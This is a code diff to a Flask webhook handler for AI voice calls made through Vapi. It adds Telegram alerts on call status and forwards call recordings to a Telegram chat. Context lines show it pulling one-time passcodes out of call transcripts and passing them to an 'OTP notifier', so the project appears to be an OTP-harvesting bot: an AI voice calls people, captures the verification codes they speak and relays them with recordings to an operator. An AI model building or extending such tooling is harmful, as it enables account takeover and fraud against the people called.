@@ -1,9 +1,12 @@
 import json
 import logging
+import os
 import re
+import threading
 from datetime import datetime
 from typing import Optional
 
+import requests
 from flask import Response
 
 logger = logging.getLogger(__name__)
@@ -32,11 +35,24 @@ def extract_otp_from_transcript(text: str, code_length: int = 6) -> Optional[str
     return None
 
 
-def handle_vapi_webhook(request) -> Response:
-    """Process incoming Vapi webhook events.
+def _send_telegram(chat_id: int, text: str, **kwargs):
+    if not chat_id:
+        return
+    try:
+        from handlers.otp_notifier import _bot_instance
+        if _bot_instance:
+            _bot_instance.send_message(chat_id, text, **kwargs)
+        else:
+            import telebot
+            token = os.getenv("BOT_TOKEN", "")
+            if token and token != "YOUR_BOT_TOKEN_HERE":
+                tb = telebot.TeleBot(token)
+                tb.send_message(chat_id, text, **kwargs)
+    except Exception as e:
+        logger.debug(f"Failed to send Telegram message to {chat_id}: {e}")
 
-    Vapi sends events for: call.started, call.ended, transcript, recording.ready, etc.
-    """
+
+def handle_vapi_webhook(request) -> Response:
     try:
         payload = request.get_json(force=True, silent=True)
         if not payload:
@@ -47,12 +63,17 @@ def handle_vapi_webhook(request) -> Response:
         vapi_call_id = call_data.get("id") or payload.get("callId")
         call_sid = call_data.get("twilioCallSid") or call_data.get("phoneCallProviderId")
 
-        logger.info("[VAPI_WEBHOOK] type=%s vapi_call_id=%s call_sid=%s", event_type, vapi_call_id, call_sid)
+        metadata = payload.get("metadata") or {}
+        chat_id = metadata.get("chat_id")
+
+        logger.info("[VAPI_WEBHOOK] type=%s vapi_call_id=%s call_sid=%s chat_id=%s", event_type, vapi_call_id, call_sid, chat_id)
 
         if event_type in ("call.started", "call.ringing"):
+            _send_telegram(chat_id, "📞 Call ringing...")
             return Response("OK")
 
         if event_type == "call.answered":
+            _send_telegram(chat_id, "📞 Call answered. AI assistant is speaking...")
             return Response("OK")
 
         if event_type in ("transcript", "transcription", "call.transcript"):
@@ -98,6 +119,7 @@ def _handle_transcript(payload: dict, call_sid: Optional[str], vapi_call_id: Opt
                         call_sid=call_sid,
                         digits=otp,
                         user_id=user_id or "unknown",
+                        vapi_call_id=vapi_call_id,
                     )
         return Response("OK")
     except Exception as e:
@@ -108,21 +130,35 @@ def _handle_transcript(payload: dict, call_sid: Optional[str], vapi_call_id: Opt
 def _handle_call_ended(payload: dict, call_sid: Optional[str], vapi_call_id: Optional[str]) -> Response:
     try:
         call_data = payload.get("call", payload)
-        duration = call_data.get("durationMs") or call_data.get("duration", 0)
+        duration_ms = call_data.get("durationMs") or 0
+        duration_s = round(duration_ms / 1000) if duration_ms else 0
         status = call_data.get("status", "completed")
-        logger.info("[VAPI_CALL_ENDED] call_sid=%s duration=%s status=%s", call_sid, duration, status)
 
-        if call_sid:
-            from bot import log_call_completion, get_twilio_client
-            client = get_twilio_client()
-            if client:
-                try:
-                    recording_sids = [
-                        r.get("sid") for r in (call_data.get("recordings") or [])
-                    ]
-                except Exception:
-                    recording_sids = []
-                log_call_completion(call_sid, status, str(duration), recording_sids)
+        logger.info("[VAPI_CALL_ENDED] call_sid=%s duration=%ss status=%s", call_sid, duration_s, status)
+
+        metadata = payload.get("metadata") or {}
+        chat_id = metadata.get("chat_id")
+        user_id = metadata.get("user_id")
+
+        if chat_id:
+            from bot import send_call_complete_menu
+            if status == "completed":
+                _send_telegram(chat_id, f"✅ Call completed. Duration: {duration_s}s")
+            elif status == "failed":
+                _send_telegram(chat_id, "❌ Call failed.")
+            elif status == "no-answer":
+                _send_telegram(chat_id, "⏱️ No answer.")
+            elif status == "busy":
+                _send_telegram(chat_id, "ℹ️ Line busy.")
+            elif status == "canceled":
+                _send_telegram(chat_id, "ℹ️ Call canceled.")
+            else:
+                _send_telegram(chat_id, f"📞 Call ended. Status: {status}")
+            try:
+                send_call_complete_menu(int(chat_id))
+            except Exception:
+                pass
+
         return Response("OK")
     except Exception as e:
         logger.error("[VAPI_CALL_ENDED_ERROR] %s", e)
@@ -136,12 +172,71 @@ def _handle_recording(payload: dict, call_sid: Optional[str], vapi_call_id: Opti
             or payload.get("message", {}).get("recordingUrl")
             or payload.get("call", {}).get("recordingUrl")
         )
-        if recording_url and call_sid:
-            metadata = payload.get("metadata", {})
-            user_id = metadata.get("user_id")
-            if user_id:
-                from bot import download_and_store_recording
-                download_and_store_recording(call_sid, user_id, recording_url)
+        if not recording_url:
+            logger.info("[VAPI_RECORDING] no recordingUrl in payload")
+            return Response("OK")
+
+        metadata = payload.get("metadata") or {}
+        chat_id = metadata.get("chat_id")
+        user_id = metadata.get("user_id")
+
+        logger.info("[VAPI_RECORDING] url=%s chat_id=%s user_id=%s", recording_url[:80], chat_id, user_id)
+
+        def _download_and_send():
+            try:
+                resp = requests.get(recording_url, timeout=60)
+                if resp.status_code != 200:
+                    logger.warning("[VAPI_RECORDING] download failed status=%s", resp.status_code)
+                    if chat_id:
+                        _send_telegram(chat_id, "⚠️ Recording could not be downloaded.")
+                    return
+
+                from bot import send_call_complete_menu
+                audio_data = resp.content
+
+                if user_id:
+                    from core.files import ensure_user_path, user_conf_path
+                    ensure_user_path(user_id)
+                    ext = ".wav"
+                    if "content-type" in resp.headers:
+                        ct = resp.headers["content-type"]
+                        if "mp3" in ct:
+                            ext = ".mp3"
+                        elif "ogg" in ct:
+                            ext = ".ogg"
+                    file_path = str(user_conf_path(user_id) / f"recording{ext}")
+                    with open(file_path, "wb") as f:
+                        f.write(audio_data)
+                    logger.info("[VAPI_RECORDING] saved to %s", file_path)
+
+                if chat_id:
+                    from handlers.otp_notifier import _bot_instance
+                    import io
+                    audio_io = io.BytesIO(audio_data)
+                    audio_io.name = f"recording_{call_sid or 'unknown'}.wav"
+                    try:
+                        if _bot_instance:
+                            _bot_instance.send_audio(int(chat_id), audio_io, caption="📞 Call recording", timeout=30)
+                        else:
+                            import telebot
+                            token = os.getenv("BOT_TOKEN", "")
+                            if token and token != "YOUR_BOT_TOKEN_HERE":
+                                tb = telebot.TeleBot(token)
+                                tb.send_audio(int(chat_id), audio_io, caption="📞 Call recording", timeout=30)
+                    except Exception as e:
+                        logger.warning("[VAPI_RECORDING] failed to send audio: %s", e)
+                        _send_telegram(chat_id, "✅ Call completed. Recording saved but could not send audio to chat.")
+                    try:
+                        send_call_complete_menu(int(chat_id))
+                    except Exception:
+                        pass
+
+            except Exception as e:
+                logger.error("[VAPI_RECORDING_DOWNLOAD_ERROR] %s", e)
+                if chat_id:
+                    _send_telegram(chat_id, "⚠️ Failed to download recording.")
+
+        threading.Thread(target=_download_and_send, daemon=True).start()
         return Response("OK")
     except Exception as e:
         logger.error("[VAPI_RECORDING_ERROR] %s", e)
